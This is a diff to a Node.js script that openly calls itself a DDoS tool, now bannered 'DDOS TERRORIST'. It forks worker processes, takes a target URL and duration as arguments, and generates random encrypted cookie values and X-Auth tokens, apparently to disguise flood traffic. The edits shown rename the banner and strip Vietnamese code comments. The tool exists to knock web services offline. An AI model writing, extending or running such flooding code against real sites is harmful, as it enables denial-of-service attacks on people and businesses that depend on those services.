@@ -990,7 +990,7 @@ if (cluster.isMaster) {
         cluster.fork();
         console.clear()
     }
-    console.log('\x1b[38;2;255;0;0m' + 'DDOS GURU ENTERPRISE'.bgRed);
+    console.log('\x1b[38;2;255;0;0m' + 'DDOS TERRORIST'.bgRed);
     console.log(`═════════╩═════════════════════════════════╩═════════`.gray)
     console.log('\x1b[38;2;255;0;0m' + `Url:` + process.argv[2].rainbow)
     console.log('\x1b[38;2;255;0;0m' + `Time:` + process.argv[3].rainbow)
@@ -1054,18 +1054,15 @@ class NetSocket {
 const randomString = crypto.randomBytes(20).toString('hex');
 const secretKey = crypto.randomBytes(32);
 
-// Tạo đối tượng cipher để mã hóa cookie bằng thuật toán AES-256-CBC
 var ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
 
-// Mã hóa chuỗi ngẫu nhiên và lưu kết quả vào biến encrypted
 let encrypted = ciphe.update(randomString, 'utf8', 'hex');
 encrypted += ciphe.final('hex');
 
-// Tạo cookie với giá trị đã mã hóa
 const cookieValue = encrypted;
 
-const bytes = crypto.randomBytes(16); // Tạo 16 byte ngẫu nhiên
-const xAuthToken = bytes.toString('hex'); // Chuyển đổi thành chuỗi hex
+const bytes = crypto.randomBytes(16);
+const xAuthToken = bytes.toString('hex');
 
 const currentTime = new Date();
 const httpTime = currentTime.toUTCString();
